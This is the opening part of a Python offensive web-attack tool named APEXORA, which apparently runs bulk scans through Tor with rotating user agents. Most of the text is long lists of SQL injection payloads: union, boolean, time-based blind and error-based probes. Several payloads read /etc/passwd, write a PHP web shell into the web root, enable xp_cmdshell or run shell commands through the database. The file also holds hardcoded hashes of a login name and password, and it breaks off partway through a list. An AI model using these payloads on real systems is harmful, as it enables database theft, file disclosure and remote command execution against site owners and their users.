#!/usr/bin/env python3
import os, sys, json, time, socket, ssl, base64, random, re, hashlib, struct, hmac
import http.client, urllib.request, urllib.error, urllib.parse
import sqlite3, argparse, threading, shlex, signal, subprocess, getpass, secrets
import statistics, concurrent.futures, collections, math
from pathlib import Path
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote

WORK_DIR = Path.home() / "APEXORA"
DB_FILE = WORK_DIR / "db" / "apexora.sqlite"
AUTH_FILE = WORK_DIR / ".auth"
SCOPE_FILE = WORK_DIR / "scope.txt"
REPORT_DIR = WORK_DIR / "reports"
USER_AGENTS_FILE = WORK_DIR / "useragent.txt"
OOB_FILE = WORK_DIR / "oob.json"
RATE_FILE = WORK_DIR / "rate.json"
TOR_FILE = WORK_DIR / "tor.json"
BULK_FILE = WORK_DIR / "bulk_targets.txt"
WORK_DIR.mkdir(parents=True, exist_ok=True)
(WORK_DIR / "db").mkdir(exist_ok=True)
REPORT_DIR.mkdir(exist_ok=True)
HOST = "127.0.0.1"

TTY = sys.stdout.isatty()

_AUTH_USER_HASH = hashlib.sha256(b"sylhetyhackvenger").hexdigest()
_AUTH_PASS_HASH = hashlib.sha256(b"error808").hexdigest()
AUTH_TTL_HOURS = 24

_DEFAULT_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "curl/8.4.0",
    "Wget/1.21.3",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
]

def _load_user_agents():
    pool = list(_DEFAULT_UA_POOL)
    if USER_AGENTS_FILE.exists():
        try:
            for line in USER_AGENTS_FILE.read_text(errors="ignore").splitlines():
                s = line.strip()
                if s and not s.startswith("#"):
                    pool.append(s)
        except Exception:
            pass
    return pool

_UA_POOL = _load_user_agents()
_UA_LOCK = threading.Lock()
_UA_IDX = 0

def _next_user_agent():
    global _UA_IDX
    with _UA_LOCK:
        ua = _UA_POOL[_UA_IDX % len(_UA_POOL)]
        _UA_IDX += 1
        return ua

C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_DIM = "\033[2m"
C_RED = "\033[91m"
C_GRN = "\033[92m"
C_YEL = "\033[93m"
C_BLU = "\033[94m"
C_MAG = "\033[95m"
C_CYN = "\033[96m"
C_WHT = "\033[97m"
C_BG_RED = "\033[41m"
C_BG_GRN = "\033[42m"

PAYLOADS_SQLI = [
    "'","''","`","``",",",'"','""',"/","//","\\","\\\\",";","' or \"","-- or #","' OR '1","' OR 1 -- -",'" OR "" = "',
    '" OR 1 = 1 -- -',"' OR '' = '","'='","'LIKE'","'=0--+"," OR 1=1","' OR 'x'='x","' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2","%00","/*...*/","1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
    "1' ORDER BY 1,2--+","1' ORDER BY 1,2,3--+","'--","' #","'/*","' OR '1'='1","' OR 1=1--","' OR 1=1#",
    '" OR "1"="1','" OR 1=1--','" OR 1=1#',"admin'--","admin' #","admin'/*",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--","' AND 1=(SELECT COUNT(*) FROM tablename)--",
    "' OR 1=1 LIMIT 1--","' OR 1=1 LIMIT 1 OFFSET 1--","' GROUP BY 1,2,3--","' ORDER BY 1--","' ORDER BY 2--",
    "' ORDER BY 10--","'); WAITFOR DELAY '0:0:5'--","'); SELECT PG_SLEEP(5)--",
    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='","1' AND 1=1","1' AND 1=2",'1" AND 1=1','1" AND 1=2',
    "' OR TRUE--",'" OR TRUE--',"' OR 1=1#","' OR 1=1/*","' OR 'a'='a","' OR 'a'='b","') OR ('1'='1",
    "') OR ('1'='1'--","') OR ('1'='1'#",'") OR ("1"="1','") OR ("1"="1"--','") OR ("1"="1"#',
    "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/","%27%20OR%201%3D1--","0x61646d696e",
    "CHAR(39,79,82,39,49,39,61,39,49)","'/**/OR/**/1=1--","'OR%091=1--","'OR%0a1=1--","'OR%0b1=1--",
    "'OR%0c1=1--","'OR%0d1=1--","'OR%a01=1--","' UNION SELECT 1,2,3--","' UNION SELECT @@VERSION,2,3--",
    "' UNION SELECT version(),2,3--",'{"id": "1\' OR 1=1--"}',"SELECT @@VERSION, USER(), DATABASE();",
    "SELECT table_name FROM information_schema.tables;",
    "SELECT column_name FROM information_schema.columns WHERE table_name = 'users';",
    "SELECT 'malicious code' INTO OUTFILE '/var/www/html/shell.php';","SELECT LOAD_FILE('/etc/passwd');",
    "SELECT CONCAT('a', 'b');","' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
    "SLEEP(5)","' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--","' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='",
    "SELECT @@datadir, @@basedir, @@plugin_dir","SHOW VARIABLES LIKE 'secure_file_priv'",
    "SELECT @@VERSION, SUSER_SNAME(), DB_NAME();","SELECT name FROM sysobjects WHERE xtype = 'U';",
    "EXEC xp_cmdshell 'whoami';","WAITFOR DELAY '0:0:5';","' AND 1=1--","' AND 1=2--","' OR 1=1--",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
    "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
    "SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS x;","SELECT banner FROM v$version;",
    "SELECT user FROM dual;","SELECT table_name FROM all_tables;",
    "SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';","BEGIN DBMS_LOCK.SLEEP(5); END;",
    "' OR 1=1--","' UNION SELECT NULL FROM DUAL--","' UNION SELECT NULL,NULL FROM DUAL--",
    "SELECT UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1)) FROM dual;",
    "SELECT utl_http.request('http://127.0.0.1/') FROM dual;",
    "SELECT version(), current_user, current_database();",
    "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';",
    "COPY (SELECT 'malicious') TO '/tmp/test';","CREATE TABLE shell(output text);",
    "COPY shell FROM PROGRAM 'id';","SELECT pg_sleep(5);","' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)--",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' OR 1=1--","SELECT pg_read_file('/etc/passwd');",
    "SELECT pg_read_binary_file('/etc/passwd');","SHOW data_directory;","SHOW hba_file;","SHOW config_file;",
    "SELECT sqlite_version();","SELECT name FROM sqlite_master WHERE type='table';","PRAGMA table_info('users');",
    "ATTACH DATABASE '/var/www/html/shell.php' AS pwn;","CREATE TABLE pwn.shell (code TEXT);",
    "INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET[\"cmd\"]); ?>');","' OR 1=1--",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","SELECT readfile('/etc/passwd');",
    "(sleep 5)--","(sleep 5)","(sleep(5))--","(sleep(5))","-sleep(5)","SLEEP(5)#","SLEEP(5)--",'SLEEP(5)="',"SLEEP(5)='",
    '";sleep 5--','";sleep 5','";sleep(5)--','";sleep(5)','";SELECT SLEEP(5); #',"1 SELECT SLEEP(5); #",
    "+ SLEEP(5) + '","&&SLEEP(5)","&&SLEEP(5)--","&&SLEEP(5)#",";sleep 5--",";sleep 5",";sleep(5)--",";sleep(5)",
    ";SELECT SLEEP(5); #","'&&SLEEP(5)&&'1","' SELECT SLEEP(5); #","benchmark(50000000,MD5(1))",
    "benchmark(50000000,MD5(1))--","or benchmark(50000000,MD5(1))","ORDER BY SLEEP(5)","ORDER BY SLEEP(5)--",
    "AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337","OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337",
    "RANDOMBLOB(5000000000/2)","AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000000/2))))",
    "'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",'"XOR(if(now()=sysdate(),sleep(5),0))XOR"Z',
    "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z","(SELECT(0)FROM(SELECT(SLEEP(5)))a)",
    "1 AND (SELECT(0)FROM(SELECT(SLEEP(5)))a)-- wXyW","(SELECT * FROM (SELECT(SLEEP(5)))a)",
    "'%2b(select*from(select(sleep(5)))a)%2b'","CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(5))END",
    "-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//","BENCHMARK(10000000,MD5(CHAR(116)))",
    "'%2bbenchmark(10000000,sha1(1))%2b'","if(now()=sysdate(),sleep(5),0)","0'|(IF((now())LIKE(sysdate()),SLEEP(5),0))|'Z",
    "desc%2c(select*from(select(sleep(5)))a)","-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))",
    "waitfor delay '00:00:05'","waitfor delay '00:00:05' --","%00 waitfor delay '00:00:05'",
    "%00 waitfor delay '00:00:05' --","%00' waitfor delay '00:00:05' --","%00';waitfor delay '00:00:05' --",
    "%0a waitfor delay '00:00:05'","%0a';waitfor delay '00:00:05' --","%0d%0a waitfor delay '00:00:05'",
    "%0d%0a';waitfor delay '00:00:05' --","';waitfor delay '00:00:05' --",";waitfor delay '00:00:05' --",
    "0x00 waitfor delay '00:00:05'","0x00;waitfor delay '00:00:05' --","0x0a waitfor delay '00:00:05'",
    "0x0a';waitfor delay '00:00:05' --","0x0d0a waitfor delay '00:00:05'","0x0d0a';waitfor delay '00:00:05' --",
    ";SELECT pg_sleep(5);","SELECT pg_sleep(5);","1 SELECT pg_sleep(5);","or SELECT pg_sleep(5);",
    "(SELECT pg_sleep(5))","pg_sleep(5)--","1 or pg_sleep(5)--",'" or pg_sleep(5)--',"' or pg_sleep(5)--",
    "1) or pg_sleep(5)--",'") or pg_sleep(5)--',"') or pg_sleep(5)--","1)) or pg_sleep(5)--",
    '")) or pg_sleep(5)--',"' SELECT pg_sleep(5);","1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))",
    "1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337","1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337",
    " and 1337=(select 1337 from pg_sleep(5))"," or 1337=(select 1337 from pg_sleep(5))",";select pg_sleep(5)",
    "' AND 1=1--","' AND 1=2--","' AND '1'='1","' AND '1'='2","1' AND '1'='1","1' AND '1'='2","1 AND 1=1","1 AND 1=2",
    "' OR 1=1--","' OR 1=2--","admin' AND '1'='1","admin' AND '1'='2","' AND (SELECT 1)=(SELECT 1)--",
    "' AND (SELECT 1)=(SELECT 2)--","' AND 1=1#","' AND 1=2#","' OR 1=1#","' OR 1=2#","1 AND 1=1--","1 AND 1=2--",
    "1 OR 1=1--","1 OR 1=2--","' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--","' UNION SELECT NULL,NULL,NULL,NULL,NULL--","' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--","' UNION SELECT 1,2,3--","' UNION SELECT 1,2,3,4--","' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT 'a','b','c'--","AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
    "AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--","AND 1=CONVERT(int,(SELECT @@version))--",
    "AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    "AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--",
    "AND 1=CAST((SELECT current_database()) AS int)--","AND 1=CAST((SELECT sqlite_version()) AS INTEGER)--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--","' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),5)--",
    "'||(SELECT '')||'","'||(SELECT 1)||'","'||(SELECT version())||'","' AND 1=1 AND ''='",
    "' AND 1=1 AND 'a'='a","' AND 1=2 AND 'a'='a","' AND 'a'='a' AND '1'='1","1' AND '1'='1' AND '1'='1",
    "' AND 1=1 LIMIT 1--","' AND 1=2 LIMIT 1--","' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",
    "' RLIKE (SELECT (CASE WHEN (1=2) THEN 1 ELSE 0x28 END))--","' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
    "' AND SLEEP(5) AND '1'='1","' AND SLEEP(5)#","' OR SLEEP(5)#","' OR SLEEP(5)--","' OR SLEEP(5) AND '1'='1",
    "1' AND SLEEP(5) AND '1'='1","1' AND SLEEP(5)#","1' OR SLEEP(5)#","1' OR SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1'--","' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='2'--",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1","' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='2",
    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1","' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='2",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--","' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)#","' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)#",
    "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--","1 OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)#","1 OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)#",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1'#","' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1'#",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='2'#","' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='2'#",
    "' AND IF(1=1,SLEEP(5),0)--","' AND IF(1=2,SLEEP(5),0)--","' OR IF(1=1,SLEEP(5),0)--","' OR IF(1=2,SLEEP(5),0)--",
    "1 AND IF(1=1,SLEEP(5),0)--","1 AND IF(1=2,SLEEP(5),0)--","1 OR IF(1=1,SLEEP(5),0)--","1 OR IF(1=2,SLEEP(5),0)--",
    "' AND IF(1=1,SLEEP(5),0)#","' AND IF(1=2,SLEEP(5),0)#","' OR IF(1=1,SLEEP(5),0)#","' OR IF(1=2,SLEEP(5),0)#",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=1-- -","' AND 1=2-- -","' OR 1=1-- -","' OR 1=2-- -","1 AND 1=1-- -","1 AND 1=2-- -","1 OR 1=1-- -","1 OR 1=2-- -",
    "' AND 1=1# -","' AND 1=2# -","' OR 1=1# -","' OR 1=2# -","1 AND 1=1# -","1 AND 1=2# -","1 OR 1=1# -","1 OR 1=2# -",
    "' AND 1=1;--","' AND 1=2;--","' OR 1=1;--","' OR 1=2;--","1 AND 1=1;--","1 AND 1=2;--","1 OR 1=1;--","1 OR 1=2;--",
    "' AND 1=1;#","' AND 1=2;#","' OR 1=1;#","' OR 1=2;#","1 AND 1=1;#","1 AND 1=2;#","1 OR 1=1;#","1 OR 1=2;#",
    "';WAITFOR DELAY '0:0:5'--","';WAITFOR DELAY '0:0:5'#","1';WAITFOR DELAY '0:0:5'--","1';WAITFOR DELAY '0:0:5'#",
    "';WAITFOR DELAY '0:0:5';--","';WAITFOR DELAY '0:0:5';#","1';WAITFOR DELAY '0:0:5';--","1';WAITFOR DELAY '0:0:5';#",
    "';SELECT PG_SLEEP(5)--","';SELECT PG_SLEEP(5)#","1';SELECT PG_SLEEP(5)--","1';SELECT PG_SLEEP(5)#",
    "';SELECT PG_SLEEP(5);--","';SELECT PG_SLEEP(5);#","1';SELECT PG_SLEEP(5);--","1';SELECT PG_SLEEP(5);#",
    "';SELECT SLEEP(5)--","';SELECT SLEEP(5)#","1';SELECT SLEEP(5)--","1';SELECT SLEEP(5)#",
    "';SELECT SLEEP(5);--","';SELECT SLEEP(5);#","1';SELECT SLEEP(5);--","1';SELECT SLEEP(5);#",
    "' OR 1=1 LIMIT 1-- -","' OR 1=1 LIMIT 1# -","' OR 1=1 LIMIT 1;--","' OR 1=1 LIMIT 1;#",
    "' OR 1=1 ORDER BY 1-- -","' OR 1=1 ORDER BY 1# -","' OR 1=1 ORDER BY 1;--","' OR 1=1 ORDER BY 1;#",
    "' OR 1=1 GROUP BY 1-- -","' OR 1=1 GROUP BY 1# -","' OR 1=1 GROUP BY 1;--","' OR 1=1 GROUP BY 1;#",
    "' OR 1=1 HAVING 1=1-- -","' OR 1=1 HAVING 1=1# -","' OR 1=1 HAVING 1=1;--","' OR 1=1 HAVING 1=1;#",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--","' UNION SELECT 1,2,3,4,5,6,7,8,9,10#",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10;--","' UNION SELECT 1,2,3,4,5,6,7,8,9,10;#",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--","' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10;--","' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10;#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;#",
    "' AND 1=1 ORDER BY 1--","' AND 1=2 ORDER BY 1--","' OR 1=1 ORDER BY 1--","' OR 1=2 ORDER BY 1--",
    "' AND 1=1 ORDER BY 1#","' AND 1=2 ORDER BY 1#","' OR 1=1 ORDER BY 1#","' OR 1=2 ORDER BY 1#",
    "' AND 1=1 ORDER BY 1;--","' AND 1=2 ORDER BY 1;--","' OR 1=1 ORDER BY 1;--","' OR 1=2 ORDER BY 1;--",
    "' AND 1=1 ORDER BY 1;#","' AND 1=2 ORDER BY 1;#","' OR 1=1 ORDER BY 1;#","' OR 1=2 ORDER BY 1;#",
    "' AND 1=1 GROUP BY 1--","' AND 1=2 GROUP BY 1--","' OR 1=1 GROUP BY 1--","' OR 1=2 GROUP BY 1--",
    "' AND 1=1 GROUP BY 1#","' AND 1=2 GROUP BY 1#","' OR 1=1 GROUP BY 1#","' OR 1=2 GROUP BY 1#",
    "' AND 1=1 GROUP BY 1;--","' AND 1=2 GROUP BY 1;--","' OR 1=1 GROUP BY 1;--","' OR 1=2 GROUP BY 1;--",
    "' AND 1=1 GROUP BY 1;#","' AND 1=2 GROUP BY 1;#","' OR 1=1 GROUP BY 1;#","' OR 1=2 GROUP BY 1;#",
]

PAYLOADS_SQLI_BLIND = [
    "' AND SUBSTRING(@@version,1,1)='5'--","' AND ASCII(SUBSTRING(user(),1,1))>64--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5)))a--","' AND 1=1#","' AND 1=2#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--","' AND LENGTH(database())>5--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u'--",
    "' AND SUBSTRING(@@version,1,1)='5'#","' AND SUBSTRING(@@version,1,1)='5'-- -",
    "' AND SUBSTRING(@@version,1,1)='5';--","' AND SUBSTRING(@@version,1,1)='5';#",
    "' AND ASCII(SUBSTRING(user(),1,1))>64#","' AND ASCII(SUBSTRING(user(),1,1))>64-- -",
    "' AND ASCII(SUBSTRING(user(),1,1))>64;--","' AND ASCII(SUBSTRING(user(),1,1))>64;#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64#","' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64;--","' AND ASCII(SUBSTRING((SELECT database()),1,1))>64;#",
    "' AND LENGTH(database())>5#","' AND LENGTH(database())>5-- -","' AND LENGTH(database())>5;--","' AND LENGTH(database())>5;#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u'#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u'-- -",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u';--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u';#",
    "' AND SUBSTRING(@@version,1,1)='8'--","' AND SUBSTRING(@@version,1,1)='8'#",
    "' AND SUBSTRING(@@version,1,1)='8'-- -","' AND SUBSTRING(@@version,1,1)='8';--","' AND SUBSTRING(@@version,1,1)='8';#",
    "' AND ASCII(SUBSTRING(user(),1,1))=114--","' AND ASCII(SUBSTRING(user(),1,1))=114#",
    "' AND ASCII(SUBSTRING(user(),1,1))=114-- -","' AND ASCII(SUBSTRING(user(),1,1))=114;--","' AND ASCII(SUBSTRING(user(),1,1))=114;#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))=116--","' AND ASCII(SUBSTRING((SELECT database()),1,1))=116#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))=116-- -","' AND ASCII(SUBSTRING((SELECT database()),1,1))=116;--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))=116;#","' AND LENGTH(database())=6--","' AND LENGTH(database())=6#",
    "' AND LENGTH(database())=6-- -","' AND LENGTH(database())=6;--","' AND LENGTH(database())=6;#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'-- -",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a';--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a';#",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--","' AND (SELECT COUNT(*) FROM information_schema.tables)>0#",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -","' AND (SELECT COUNT(*) FROM information_schema.tables)>0;--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0;#","' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.columns)>0#","' AND (SELECT COUNT(*) FROM information_schema.columns)>0-- -",
    "' AND (SELECT COUNT(*) FROM information_schema.columns)>0;--","' AND (SELECT COUNT(*) FROM information_schema.columns)>0;#",
    "' AND (SELECT COUNT(*) FROM information_schema.schemata)>0--","' AND (SELECT COUNT(*) FROM information_schema.schemata)>0#",
    "' AND (SELECT COUNT(*) FROM information_schema.schemata)>0-- -","' AND (SELECT COUNT(*) FROM information_schema.schemata)>0;--",
    "' AND (SELECT COUNT(*) FROM information_schema.schemata)>0;#",
    "' AND SUBSTRING(@@version,1,1)='5' AND '1'='1'--","' AND SUBSTRING(@@version,1,1)='5' AND '1'='1'#",
    "' AND SUBSTRING(@@version,1,1)='5' AND '1'='1'-- -","' AND SUBSTRING(@@version,1,1)='5' AND '1'='1';--",
    "' AND SUBSTRING(@@version,1,1)='5' AND '1'='1';#","' AND SUBSTRING(@@version,1,1)='5' AND '1'='2'--",
    "' AND SUBSTRING(@@version,1,1)='5' AND '1'='2'#","' AND SUBSTRING(@@version,1,1)='5' AND '1'='2'-- -",
    "' AND SUBSTRING(@@version,1,1)='5' AND '1'='2';--","' AND SUBSTRING(@@version,1,1)='5' AND '1'='2';#",
    "' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='1'--","' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='1'#",
    "' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='1'-- -","' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='1';--",
    "' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='1';#","' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='2'--",
    "' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='2'#","' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='2'-- -",
    "' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='2';--","' AND ASCII(SUBSTRING(user(),1,1))>64 AND '1'='2';#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='1'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='1'#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='1'-- -",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='1';--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='1';#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='2'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='2'#",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='2'-- -",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='2';--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 AND '1'='2';#",
    "' AND LENGTH(database())>5 AND '1'='1'--","' AND LENGTH(database())>5 AND '1'='1'#",
    "' AND LENGTH(database())>5 AND '1'='1'-- -","' AND LENGTH(database())>5 AND '1'='1';--",
    "' AND LENGTH(database())>5 AND '1'='1';#","' AND LENGTH(database())>5 AND '1'='2'--",
    "' AND LENGTH(database())>5 AND '1'='2'#","' AND LENGTH(database())>5 AND '1'='2'-- -",
    "' AND LENGTH(database())>5 AND '1'='2';--","' AND LENGTH(database())>5 AND '1'='2';#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='1'--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='1'#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='1'-- -",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='1';--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='1';#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='2'--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='2'#",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='2'-- -",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' AND '1'='2';--",
